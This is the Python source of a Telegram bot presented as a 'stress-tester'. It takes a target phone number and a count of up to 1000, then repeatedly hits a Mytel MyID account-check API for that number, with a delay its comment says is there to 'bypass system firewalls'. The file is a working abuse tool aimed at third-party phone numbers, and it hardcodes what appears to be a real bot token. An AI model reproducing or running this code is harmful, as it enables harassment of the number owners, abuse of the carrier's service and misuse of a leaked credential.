import logging
import requests
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- Configuration ---
API_TOKEN = '8702294693:AAGbo2lTWP-aV1jV8Be6nN5NSnz2WO_aZJk'
logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# --- States ---
class MyIDAttackChain(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

# Header configuration for API
HEADERS = {
    'User-Agent': 'MyID/3.2.1 (Android; 13)',
    'Content-Type': 'application/json'
}

# --- Premium Keyboards ---
def get_cancel_keyboard():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛑 TERMINATE ATTACK", callback_data="cancel_action"))
    return markup

# --- Handlers ---

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    welcome_text = (
        "⚡ **MYID SYSTEM STRESS-TESTER CORE**\n"
        "🌌 *DEVELOPED BY DOMINIC*\n"
        "📶 SYSTEM STATUS: OPERATIONAL\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Welcome to the high-frequency packet delivery module. "
        "Test API endpoints with high-volume concurrent queues.\n\n"
        "🛠 **SYSTEM COMMANDS:**\n"
        "➥ /attack - Initialize Packet Chain\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ *AWAITING PARAMETERS...*"
    )
    await message.answer(welcome_text, parse_mode="Markdown")

@dp.message_handler(commands=['attack'], state="*")
async def start_attack(message: types.Message):
    await message.answer(
        "📱 **ENTER TARGET PHONE NUMBER:**\n"
        "Format: `09XXXXXXXXX`", 
        reply_markup=get_cancel_keyboard(),
        parse_mode="Markdown"
    )
    await MyIDAttackChain.waiting_phone.set()

@dp.callback_query_handler(text="cancel_action", state="*")
async def cancel_action(callback_query: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await callback_query.message.edit_text("❌ **THREAD KILLED.** System execution dropped safely.")
    await callback_query.answer()

@dp.message_handler(state=MyIDAttackChain.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    
    if not phone.startswith("09") or len(phone) < 9:
        return await message.reply("❌ **ERROR:** Invalid format. Target must start with 09.")

    await state.update_data(phone=phone)
    await message.answer(
        "🔢 **ENTER PACKET QUANTITY:**\n"
        "Min: `10` | Max: `1000` payloads",
        reply_markup=get_cancel_keyboard(),
        parse_mode="Markdown"
    )
    await MyIDAttackChain.waiting_count.set()

@dp.message_handler(state=MyIDAttackChain.waiting_count)
async def process_count(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        return await message.reply("❌ **ERROR:** Numeric values only.")
    
    count = int(message.text)
    if count < 10 or count > 1000:
        return await message.reply("⚠️ **RANGE EXCEEDED:** Choose between 10 and 1000 threads.")

    user_data = await state.get_data()
    phone = user_data.get("phone")
    
    status_msg = await message.answer(
        f"⚙️ **INITIALIZING THREADS...**\n"
        f"🎯 Target: `{phone}`\n"
        f"📦 Packets: `{count}`", 
        parse_mode="Markdown"
    )
    
    success = 0
    fail = 0
    url = f"https://apis.mytel.com.mm/myid/authen/v1.0/v2/login/action/check-account?phoneNumber={phone}"

    # UI Animation Cycle Emojis
    animations = ["🛰 Sending Payload", "🛸 Piercing Gateway", "📡 Packet Injected", "⚡ Processing Loop"]

    for i in range(1, count + 1):
        try:
            # Using custom timeout to keep the pipeline moving fast
            res = requests.get(url, headers=HEADERS, timeout=4)
            if res.status_code == 200:
                success += 1
            else:
                fail += 1
        except:
            fail += 1

        # Dynamic Animation UI refresh rules
        # Updates every 5 requests if total < 100, or every 25 requests for heavy loads to prevent Telegram flood limits
        update_interval = 5 if count <= 100 else 25
        
        if i % update_interval == 0 or i == count:
            anim = animations[i % len(animations)]
            progress_bar = "▓" * int((i / count) * 10) + "░" * (10 - int((i / count) * 10))
            
            try:
                await status_msg.edit_text(
                    f"🚀 **EXECUTION IN PROGRESS**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 **Target:** `{phone}`\n"
                    f"📊 **Progress:** `[{progress_bar}] {i}/{count}`\n"
                    f"🟢 **Delivered:** `{success}`\n"
                    f"🔴 **Dropped:** `{fail}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✨ *Status: {anim}...*",
                    parse_mode="Markdown"
                )
            except Exception:
                pass # Bypass transient network lag or edit conflicts
            
        # Asynchronous balance interval to bypass system firewalls
        await asyncio.sleep(0.3)

    # Final Summary UI Presentation
    await status_msg.edit_text(
        f"🏁 **MISSION COMPLETION REPORT**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 **Target Node:** `{phone}`\n"
        f"✅ **Total Hits Packed:** `{success}`\n"
        f"❌ **Total Hits Failed:** `{fail}`\n"
        f"🛡 **Thread Registry:** `Closed/Clean Wiped`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 *All operational logs flushed by Dominic.*",
        parse_mode="Markdown"
    )
    await state.finish()

if __name__ == '__main__':
    print("Dominic's Packet Stress-Tester is Online.")
    executor.start_polling(dp, skip_updates=True)
